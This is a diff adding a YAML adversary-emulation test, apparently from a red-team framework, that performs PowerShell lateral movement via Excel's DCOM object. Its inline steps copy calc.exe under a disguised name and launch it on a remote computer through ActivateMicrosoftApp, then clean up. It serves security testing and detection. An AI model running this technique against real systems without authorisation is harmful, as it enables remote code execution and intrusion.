@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: PowerShell Lateral Movement Using Excel Application Object
+description: |
+    Powershell lateral movement using the Excel COM objects.
+
+    Reference:
+
+    https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
+
+    Upon successful execution, cmd will spawn calc.exe on a remote computer.
+args:
+    - name: computer_name
+      type: string
+      default: localhost
+    - name: user
+      type: string
+      default: admin
+uuid: 505f24be-1c11-4694-b614-e01ae1cd2570
+mitre:
+    tactics:
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1021: Remote Services'
+    subtechniques:
+        - 'T1021.003: Distributed Component Object Model'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: powershell-lateral-movement-using-excel-application-object
+      inline: |
+        copy c:\windows\system32\calc.exe 'C:\users\{{.Args.user}}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","{{.Args.computer_name}}"))
+        $com.ActivateMicrosoftApp("5")
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item 'C:\users\{{.Args.user}}\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+        executor: powershell
